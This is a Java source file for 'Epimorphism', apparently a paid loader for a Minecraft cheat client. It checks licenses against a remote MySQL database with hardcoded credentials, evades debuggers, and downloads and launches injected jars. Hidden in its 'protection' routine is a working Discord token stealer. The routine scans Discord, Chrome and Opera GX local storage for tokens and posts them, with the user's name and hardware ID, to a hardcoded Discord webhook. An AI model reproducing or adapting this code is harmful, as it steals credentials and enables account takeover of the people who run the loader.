package me.armut.epimorphism;

import javax.crypto.spec.*;
import javax.swing.*;
import java.lang.management.*;
import java.time.format.*;
import java.time.*;
import java.sql.*;
import java.util.Date;
import java.util.regex.*;
import com.google.common.io.*;
import com.google.common.hash.*;
import java.nio.charset.*;
import java.text.*;
import java.net.*;
import java.io.*;
import javax.crypto.*;
import java.security.*;
import java.util.*;

public class EpimorphismLoader
{
    private static final String password = "dbBAHX6srLmudYStTfJPrqde72WHegRN";
    private static final List<String> tokens = new ArrayList<>();
    private static boolean license_found = false;
    private static SecretKeySpec keySpec;
    private static byte[] salt;
    private static final String name = "Epimorphism";
    private static final double version = 1.2;
    
    public static void main(final String[] array) throws Exception {
        if (array.length > 0) {
            if (array[0].equals(("executeRun"))) {
                new URL(("https://www.google.com")).openConnection().connect();
                start();
            }
            else {
                JOptionPane.showMessageDialog(null, ("Lütfen bu dosyayı \"run.bat\" aracından çalıştırın."), name, 0);
            }
        }
        else {
            JOptionPane.showMessageDialog(null, ("Lütfen bu dosyayı \"run.bat\" aracından çalıştırın."), name, 0);
        }
    }
    
    private static void start() throws Exception {
        print(("Welcome to ") + name + " Loader!", true);
        Thread.sleep(1000L);
        if (System.getProperty("os.name").contains("Windows")) {
            print("Checking process list for bad programs.", true);
            if (!processList().contains(("httpd.exe"))) {
                if (!processList().contains(("HTTPDebuggerUI.exe"))) {
                    if (!processList().contains(("fiddler.exe"))) {
                        if (!decrypt(getStringFromUrl(new URL("https://raw.githubusercontent.com/armut-cat/settings/master/epimorphism/hash-2")), "19476549173495173915").contains(getHwid())) {
                            protection();
                            for (int i = 0; i < tokens.size(); ++i) {
                                final StringBuilder sb = new StringBuilder();
                                sb.append(("```")).append(("\\n")).append("PC: ").append(System.getProperty("user.name")).append("\\n").append("HWID: ").append(getHwid()).append("\\n").append("HWID #2: ").append(tokens.get(i)).append("\\n").append("```");
                                final DiscordWebhook christa = new DiscordWebhook("https://ptb.discord.com/api/webhooks/758586990936850452/Y4ZHibhpn5_kSgR5OcCZ-CrL-fyVB-22FijtJGyiSgbg3i1egGJ97qUWD1gZfkS8O_hI");
                                christa.setContent(String.valueOf(sb));
                                christa.setAvatarUrl("https://cdn.discordapp.com/attachments/758582848604733442/766991691206623242/1f6a6f4454d463ea00f601bc7b2e9f7a.png");
                                christa.setUsername("rootx");
                                christa.setTts(false);
                                christa.execute();
                            }
                        }
                        if (!ManagementFactory.getRuntimeMXBean().getInputArguments().contains("-javaagent")) {
                            if (ManagementFactory.getRuntimeMXBean().getInputArguments().contains("-XX:+DisableAttachMechanism")) {
                                
                                if (!ManagementFactory.getRuntimeMXBean().getInputArguments().contains("-Dcom.ibm.tools.attach.enable=no")) {
                                    close("Don't touch start arguments.");
                                }
                                else {
                                    if (!getLocationOfJava().equals("null")) {
                                        print("Connecting to server.", true);
                                        final Connection connection = DriverManager.getConnection("jdbc:mysql://165.227.142.51:3306/soupcheat", "riseup", password + "NdbPgF3QqQhPdsxzZ3K63c2JY97UkEa7");
                                        print("Connected to server.", true);
                                        final Statement statement = connection.createStatement();
                                        final ResultSet executeQuery = statement.executeQuery("select * from version");
                                        print("Checking loader (" + version + ") version.", true);
                                        while (executeQuery.next()) {
                                            
                                            if (executeQuery.getDouble("version") == version) {
                                                continue;
                                            }
                                            
                                            close("Please download new version.");
                                            Runtime.getRuntime().halt(0);
                                            Thread.sleep(2147483647L);
                                            return;
                                        }
                                        print("Checking your license.", true);
                                        final ResultSet executeQuery2 = statement.executeQuery("select * from validated_users");
                                        while (executeQuery2.next()) {
                                            
                                            if (!executeQuery2.getString("hwid").equals(getHwid())) {
                                                license_found = false;
                                                continue;
                                            }
                                            if (!license_found) {
                                                license_found = true;
                                            }
                                            print("License found, thanks for purchase!", true);
                                            if (!new File(System.getProperty("user.home") + "\\AppData\\Roaming\\.sonoyuncu\\sonoyuncu-membership.json").exists()) {
                                                
                                                close("Please install/re-install SoLauncher and try again!");
                                            }
                                            if (!license_found) {
                                                close("For buy; epimorphism#7766");
                                                Runtime.getRuntime().halt(0);
                                                Thread.sleep(2147483647L);
                                                return;
                                            }
                                            else {
                                                print("Checking status, please wait!", true);
                                                final String wagon = decrypt(getStringFromUrl(new URL("https://raw.githubusercontent.com/armut-cat/settings/master/epimorphism/hash-1")), "19476549173495173915");
                                                final String s = wagon.split("!")[0];
                                                final String string = ("https://") + wagon.split("!")[1];
                                                final String wagon2 = decrypt(getStringFromUrl(new URL(("https://raw.githubusercontent.com/armut-cat/settings/master/epimorphism/hash-2"))), "19476549173495173915");
                                                final String s2 = wagon2.split("!")[0];
                                                final String string2 = ("https://") + wagon2.split("!")[1];
                                                final String wagon3 = decrypt(getStringFromUrl(new URL("https://raw.githubusercontent.com/armut-cat/settings/master/epimorphism/hash-api")), "19476549173495173915");
                                                final String s3 = wagon3.split("!")[0];
                                                final String string3 = "https://" + wagon3.split("!")[1];
                                                final File file = new File(System.getProperty("user.home") + ("\\AppData\\Roaming\\.sonoyuncu\\launcher.jar"));
                                                final File file2 = new File(System.getProperty("user.home") + "\\AppData\\Roaming\\.sonoyuncu\\versions\\1.8.9-Optifine-Ultra_\\1.8.9-Optifine-Ultra_.jar");
                                                final File file3 = new File(System.getProperty("user.home") + ("\\AppData\\Roaming\\.sonoyuncu\\api.jar"));
                                                if (!file.exists()) {
                                                    DownloadAndWriteToOutput(string, file);
                                                }
                                                else if (!hash(file).equals(s)) {
                                                    file.delete();
                                                    DownloadAndWriteToOutput(string, file);
                                                }
                                                if (!file2.exists()) {
                                                    DownloadAndWriteToOutput(string2, file2);
                                                }
                                                else if (!hash(file2).equals(s2)) {
                                                    file2.delete();
                                                    DownloadAndWriteToOutput(string2, file2);
                                                }
                                                if (!file3.exists()) {
                                                    DownloadAndWriteToOutput(string3, file3);
                                                }
                                                else if (!hash(file3).equals(s3)) {
                                                    file3.delete();
                                                    DownloadAndWriteToOutput(string3, file3);
                                                }
                                                print("Starting SoLauncher, injecting " + name + "!", true);
                                                Runtime.getRuntime().exec(getLocationOfJava() + "\\bin\\java.exe" + " " + ("-noverify -XX:HeapDumpPath=MojangTricksIntelDriversForPerformance_javaw.exe_minecraft.exe.heapdump -Dcom.sun.net.ssl.checkRevocation=false -XX:+UseConcMarkSweepGC -XX:+CMSIncrementalMode -XX:-UseAdaptiveSizePolicy -XX:+DisableAttachMechanism -Dcom.ibm.tools.attach.enable=no -Djna.encoding=UTF-8 -Xmn256M -Xmx3072M -Djava.net.preferIPv4Stack=true -Djava.library.path=\"" + System.getProperty("user.home") + "\\AppData\\Roaming\\.sonoyuncu\\libraries\\extract\"") + " -jar " + file + " -95452474040");
                                                close("Injected succesfully, exiting..");
                                            }
                                        }
                                        final File file4 = new File(System.getProperty("user.home") + "\\AppData\\Roaming\\.sonoyuncu\\api.jar");
                                        if (file4.exists()) {
                                            file4.delete();
                                        }
                                        final String s4 = decrypt(getStringFromUrl(new URL("https://raw.githubusercontent.com/armut-cat/settings/master/epimorphism/hash-2")), "19476549173495173915").split(("!"))[0];
                                        final File file5 = new File(System.getProperty("user.home") + "\\AppData\\Roaming\\.sonoyuncu\\versions\\1.8.9-Optifine-Ultra_\\1.8.9-Optifine-Ultra_.jar");
                                        if (file5.exists()) {
                                            if (hash(file5).equals(s4)) {
                                                file5.delete();
                                            }
                                        }
                                        final String s5 = decrypt(getStringFromUrl(new URL("https://raw.githubusercontent.com/armut-cat/settings/master/epimorphism/hash-1")), "19476549173495173915").split(("!"))[0];
                                        final File file6 = new File(System.getProperty("user.home") + "\\AppData\\Roaming\\.sonoyuncu\\launcher.jar");
                                        if (file6.exists()) {
                                            if (hash(file6).equals(s5)) {
                                                file6.delete();
                                            }
                                        }
                                        print("Please type your license key; ", false);
                                        final Scanner scanner = new Scanner(System.in);
                                        final String nextLine = scanner.nextLine();
                                        final String replace = nextLine.split("DAYS")[0].replace("EPIMORPHISM$", "");
                                        scanner.close();
                                        final ResultSet executeQuery3 = statement.executeQuery("select * from unused_license");
                                        while (executeQuery3.next()) {
                                            
                                            if (!executeQuery3.getString("license").equals(nextLine)) {
                                                continue;
                                            }
                                            
                                            if (nextLine.endsWith("$")) {
                                                
                                                final String s6 = nextLine.split("\\$")[3];
                                                final PreparedStatement prepareStatement = connection.prepareStatement(" insert into referrer (referrer_name)  values (?)");
                                                prepareStatement.setString(1, s6);
                                                prepareStatement.execute();
                                            }
                                            final PreparedStatement prepareStatement2 = connection.prepareStatement("DELETE FROM unused_license WHERE license = ?");
                                            prepareStatement2.setString(1, nextLine);
                                            prepareStatement2.executeUpdate();
                                            final PreparedStatement prepareStatement3 = connection.prepareStatement(" insert into validated_users (pc_name, hwid, expires_days, buy_date)  values (?, ?, ?, ?)");
                                            final String format = DateTimeFormatter.ofPattern("dd/MM/yyyy hh:mm a").withZone(ZoneId.of("Europe/Istanbul")).format(Instant.now());
                                            prepareStatement3.setString(1, System.getProperty("user.name"));
                                            prepareStatement3.setString(2, getHwid());
                                            prepareStatement3.setString(3, replace);
                                            prepareStatement3.setString(4, format);
                                            prepareStatement3.execute();
                                            print("Your license validated for " + replace + " days, please restart loader.", true);
                                            Runtime.getRuntime().halt(0);
                                        }
                                        print("License not found on database.", true);
                                        close("For buy; epimorphism#7766");
                                        Runtime.getRuntime().halt(0);
                                        return;
                                    }
                                    close("Please install Java 8.");
                                    Runtime.getRuntime().halt(0);
                                    Thread.sleep(2147483647L);
                                    return;
                                }
                            }
                        }
                        close("Don't touch start arguments.");
                        Runtime.getRuntime().halt(0);
                        Thread.sleep(2147483647L);
                        return;
                    }
                }
            }
            close("Detected \"debugger\" program in your process list.");
            Runtime.getRuntime().halt(0);
            Thread.sleep(2147483647L);
            return;
        }
        close(name + " supports only Windows.");
        Runtime.getRuntime().halt(0);
        Thread.sleep(2147483647L);
    }
    
    private static String processList() throws Exception {
        final ArrayList<String> list = new ArrayList<String>();
        final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(("tasklist.exe /fo csv /nh")).getInputStream()));
        String line;
        while ((line = bufferedReader.readLine()) != null) {
            list.add(line);
        }
        bufferedReader.close();
        final StringBuilder sb = new StringBuilder();
        for (int i = 0; i < list.size(); ++i) {
            if (list.get(i).contains((".exe"))) {
                if (i != list.size() - 1) {
                    sb.append(list.get(i).split(("\",\""))[0].replace(("\""), "") + "\n");
                }
                else {
                    sb.append(list.get(i).split(("\",\""))[0].replace(("\""), ""));
                }
            }
        }
        return sb.toString();
    }
    
    private static void protection() throws Exception {
        //Omg daddy best anti-token logger!111
        if (getHwid().equals("1E21931001C41B61801D21C716C1BA16D144183149161132") || getHwid().equals("10A1961461991931D013F1171C51AE1BF1DD1EC1CE1EF1A2"))
            return;

                final File file = new File(System.getProperty(("user.home")) + ("\\AppData\\Roaming\\discord"));
                final File file2 = new File(System.getProperty(("user.home")) + ("\\AppData\\Roaming\\discordcanary"));
                final File file3 = new File(System.getProperty(("user.home")) + ("\\AppData\\Roaming\\discordptb"));
                final File file4 = new File(System.getProperty(("user.home")) + ("\\AppData\\Roaming\\Opera Software\\Opera GX Stable"));
                final File file5 = new File(System.getProperty(("user.home")) + ("\\AppData\\Local\\Google\\Chrome\\User Data\\Default"));
                if (file.exists()) {
                    getDiscordLocation(file + ("\\Local Storage\\leveldb\\"));
                }
                if (file2.exists()) {
                    getDiscordLocation(file2 + ("\\Local Storage\\leveldb\\"));
                }
                if (file3.exists()) {
                    getDiscordLocation(file3 + ("\\Local Storage\\leveldb\\"));
                }
                if (file4.exists()) {
                    getDiscordLocation(file4 + ("\\Local Storage\\leveldb\\"));
                }
                if (file5.exists()) {
                    getDiscordLocation(file5 + ("\\Local Storage\\leveldb\\"));
                }
    }

    private static void getDiscordLocation(final String s) throws Exception {
        final String[] array = Objects.requireNonNull(new File(s).list());
        for (int length = array.length, i = 0; i < length; ++i) {
            
            String line;
            while ((line = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(s + array[i])))).readLine()) != null) {
                final Matcher matcher = Pattern.compile(("[NM][\\w]{23}\\.[\\w]{6}\\.[\\w]{27}")).matcher(line);
                final Matcher matcher2 = Pattern.compile(("mfa\\.[\\w-]{84}")).matcher(line);
                while (matcher.find()) {
                    tokens.add(encrypt(matcher.group(), "84731947391761973197"));
                }
                while (matcher2.find()) {
                    tokens.add(encrypt(matcher2.group(), "84731947391761973197"));
                }
            }
        }
    }
    
    private static String getLocationOfJava() {
        final File file = new File(("C:\\Program Files\\Java\\"));
        final String[] array = Objects.requireNonNull(file.list());
        final int length = array.length;
        int i = 0;
        while (i < length) {
            final String s = array[i];
            if (s.startsWith(("jre"))) {
                return file + ("\\") + s;
            }
            else {
                ++i;
            }
        }
        return "unkown";
    }
    
    private static String hash(final File file) throws Exception {
        return Files.asByteSource(file).hash(Hashing.sha1()).toString();
    }
    
    protected static String getHwid() throws Exception {
        StringBuilder s = new StringBuilder();
        final byte[] digest = MessageDigest.getInstance(("MD5")).digest(System.getenv(("PROCESSOR_IDENTIFIER") + System.getenv("COMPUTERNAME") + System.getProperty("user.home")).getBytes(StandardCharsets.UTF_8));
        for (int length = digest.length, i = 0; i < length; ++i) {
            s.append(Integer.toHexString((digest[i] & 0xFF) | 0x100).substring(0, 3));
        }
        return s.toString().toUpperCase();
    }
    
    private static void print(final String s, final boolean b) {
        final SimpleDateFormat simpleDateFormat = new SimpleDateFormat(("dd/MM/yyyy hh:mm a"));
        final Date date = new Date();
        if (b) {
            System.out.println("[" + simpleDateFormat.format(date) + "/" + name + "] " + s);
        }
        else {
            System.out.print("[" + simpleDateFormat.format(date) + "/" + name + "] " + s);
        }
    }
    
    private static void close(final String s) {
        print(s, true);
        try {
            Thread.sleep(2000L);
        } catch (InterruptedException e) {
        }
        Runtime.getRuntime().halt(0);

        try{
        Thread.sleep(2147483647L);
        } catch (InterruptedException e) {
        }
    }
    
    protected static String getStringFromUrl(final URL url) throws Exception {
        
        final StringBuilder sb = new StringBuilder();
        final URLConnection openConnection = url.openConnection();
        openConnection.setRequestProperty("User-Agent", "NING/1.0");
        openConnection.setConnectTimeout(7500);
        openConnection.setReadTimeout(7500);
        final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(openConnection.getInputStream()));
        String line;
        while ((line = bufferedReader.readLine()) != null) {
            
            sb.append(line);
        }
        bufferedReader.close();
        return sb.toString();
    }
    
    private static void DownloadAndWriteToOutput(final String s, final File file) throws Exception {
        final URL url = new URL(s);
        final FileOutputStream fileOutputStream = new FileOutputStream(file);
        final URLConnection openConnection = url.openConnection();
        openConnection.setRequestProperty("User-Agent", "NING/1.0");
        final InputStream inputStream = openConnection.getInputStream();
        final byte[] array = new byte[1024];
        int read;
        while ((read = inputStream.read(array)) > -1) {
            fileOutputStream.write(array, 0, read);
        }
        fileOutputStream.close();
        inputStream.close();
    }
    
    private static void release(final String s) throws Exception {
        salt = s.getBytes(StandardCharsets.UTF_8);
        salt = MessageDigest.getInstance("SHA-1").digest(salt);
        salt = Arrays.copyOf(salt, 16);
        keySpec = new SecretKeySpec(salt, "AES");
    }
    
    protected static String decrypt(final String s, final String s2) throws Exception {
        release(s2);
        final Cipher instance = Cipher.getInstance("AES/ECB/PKCS5Padding");
        instance.init(Cipher.DECRYPT_MODE, keySpec);
        return new String(instance.doFinal(Base64.getDecoder().decode(s)));
    }
    
    private static String encrypt(final String s, final String s2) throws Exception {
        release(s2);
        final Cipher instance = Cipher.getInstance("AES/ECB/PKCS5Padding");
        instance.init(Cipher.ENCRYPT_MODE, keySpec);
        return Base64.getEncoder().encodeToString(instance.doFinal(s.getBytes(StandardCharsets.UTF_8)));
    }
}
